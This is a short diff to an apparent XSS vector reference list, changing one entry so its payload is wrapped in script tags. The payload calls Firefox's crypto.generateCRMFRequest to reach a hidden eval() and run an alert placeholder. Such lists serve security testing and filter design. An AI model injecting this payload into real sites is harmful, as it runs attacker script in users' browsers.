@@ -132,7 +132,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : 'crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')',
+        'data'       : '<script>crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')</script>',
         'description': {
             'en' : 'This vector uncovers a hidden eval() inside the Firefox crypto object',
             'ja' : 'Firefox crypto \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u5185\u306b\u96a0\u3055\u308c\u305f eval\u0028\u0029 \u6a5f\u80fd\u3067\u3059\u3002',
